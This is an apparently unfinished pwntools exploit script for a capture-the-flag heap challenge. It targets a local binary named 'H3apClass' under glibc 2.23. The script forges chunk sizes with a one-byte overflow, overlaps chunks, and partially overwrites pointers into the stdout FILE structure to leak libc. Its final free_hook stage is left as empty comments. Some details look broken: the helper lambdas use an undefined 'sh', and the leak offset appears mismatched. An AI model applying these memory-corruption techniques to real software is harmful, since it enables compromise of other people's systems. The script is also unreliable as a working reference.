#coding:utf-8
from pwn import *

p=process('./H3apClass')
libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
context.log_level='debug'
context.terminal=['tmux','splitw','-h']
context.arch = 'amd64'

#------------------------------------------------
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s,timeout=1)
ti = lambda : sh.interactive()
#------------------------------------------------

def leak(offset):
    libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - offset
    print "[+]libc_base=>"+hex(libc_base)
    return libc_base

def menu(idx):
    p.recvuntil('4:Drop homework\n')
    p.sendline(str(idx))

def add(idx,size,content):
    menu(1)
    p.recvuntil('Which homework?\n')
    p.sendline(str(idx))
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.send(content)

def  edit(idx,content):
    menu(3)
    p.recvuntil('Which homework?\n')
    p.sendline(str(idx))
    p.recvuntil('content:\n')
    p.send(content)

def free(idx):
    menu(4)
    p.recvuntil('Which homework?\n')
    p.sendline(str(idx))

attach(p,'b main')
#------------------------------------exp
fake = 'a'*0x28
add(0,0x28,fake)
add(1,0xf8,'1'*0xf0)
add(2,0xf8,'2'*0xf0)
add(3,0xf8,'protect')
add(4,0xf8,'protect')
add(5,0xf8,'protect')
add(6,0xf8,'protect')

free(3)
free(2)
free(6)
#------------------------------------try to create a fake chunk
payload = 'a'*0x28 + '\x01\x05'
edit(0,payload)
#------------------------------------overlap
free(1)
#------------------------------------split unsorted bin hjack fd
add(1,0xd0,'junk'.ljust(0xd0,'a'))
# pause()
# 为什么fd_nextsize和 bk_nextsize的位置也被清空了
add(2,0x18,'b'*0x18)

#------------------------------------overwrite to IO and leak
add(3,0x28,p16(0xf6a0))
free(0)
add(0,0xf0,p16(0xf6a0))

free(0)
payload = p64(0xfffffbad1887)+ p64(0)*3+"\x00"
add(0,0xf0,payload)
libc_base = leak(0x1eb980) # use gdb sub
#------------------------------------get free chunk

#------------------------------------malloc to free_hook

#------------------------------------
p.interactive()